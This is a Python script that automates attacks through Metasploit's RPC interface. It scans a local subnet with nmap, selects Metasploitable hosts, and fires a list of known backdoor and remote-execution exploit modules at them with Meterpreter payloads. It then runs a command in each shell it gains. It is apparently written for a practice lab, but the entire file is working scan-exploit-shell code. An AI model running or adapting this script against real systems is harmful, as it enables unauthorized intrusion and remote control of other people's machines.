from sys import argv
from typing import Protocol
from pymetasploit3.msfrpc import *
import nmap
import time
import random
import json
# Connect to RPC client
# if len(argv) <= 1:
#     print('Please provide RPC password as an argument')
#     exit(1)

def init():
    try:
        print('Connecting to client...')
        client = MsfRpcClient("mypassword", port=55552)
        print('Connection successful')
        return client
    except:
        print('Error connecting to client: ensure that RPC client is running on port 55552 and password is correct')
        exit(1)

def scan(client): 
    # Scan local network range using nmap
    print('Beginning scan of network...')
    nm = nmap.PortScanner()
    nm.scan(hosts='10.0.2.0/24', arguments='-PA22,80,433')
    data = nm.get_nmap_last_output()
    
    # Import scan into Metasploit database
    workspace = Workspace(client, 'default')
    workspace.importdata(data)
    hosts = workspace.hosts.records('hosts')
    services = workspace.services.records('services')
    
    # Identify Metasploitable instances
    targets = []
    for service in services:
        if "Metasploitable" in service["info"]:
            targets += [service["host"]]
    print(f'Scan complete: {len(hosts)} hosts found on network, {len(targets)} are targets')
    return targets

# Loop through targets, attempting to exploit each with given list of exploits
def attempt_exploit(client, target, exploits, timeout):
    try:
        count = 0
        pwned = len(client.sessions.list)
        start_time = time.time()
        # Loop through all exploits using Meterpreter payloads
        for e in exploits:
            exploit = client.modules.use('exploit', e)
            try:
                for p in exploit.targetpayloads():
                    if 'meterpreter' in p:
                        # Set host option to be target hostname
                        try:
                            exploit['RHOST'] = target
                        except KeyError:
                            try:
                                exploit['RHOSTS'] = target
                            except KeyError:
                                continue
                        count+=1
                        print(f'Attempting attack {count} against {target} - exploit {e} with payload {p}')
                        job = exploit.execute(payload=p)
                        job_id = job['job_id']
                        start_time = time.time()
                        while(str(job_id) in list(client.jobs.list.keys())):
                            # Wait for job to succeed, fail, or timeout
                            if time.time() - start_time >= timeout:
                                client.jobs.stop(job_id)
                                break
                        # If attack has succeeded on target, stop
                        if len(client.sessions.list) > pwned:
                            pwned = len(client.sessions.list)
                            raise StopIteration
            except ValueError:
                pass

    except StopIteration:
        pass

def main():
    # Variables for exploitation loop
    timeout = 30
    #rm 'multi/http/php_cgi_arg_injection' was bad
    top_exploits = ['unix/ftp/vsftpd_234_backdoor','multi/samba/usermap_script','multi/misc/java_rmi_server','linux/postgres/postgres_payload','unix/irc/unreal_ircd_3281_backdoor','unix/misc/distcc_exec']
    # Connect to RPC and scan network for Metasploitable
    client = init()
    targets = scan(client)
    for targ in targets:
        random.shuffle(top_exploits)
        attempt_exploit(client, targ, top_exploits, timeout)
    print(f'Sessions:\n{json.dumps(client.sessions.list, indent=4)}\n\n')
    for key in list(client.sessions.list.keys()):
        shell = client.sessions.session(key)
        # print(f'Session info:\n{json.dumps(shell.info, indent=4)}\n')
        print(shell.run_with_output("ls"))


if __name__ == "__main__":
    main()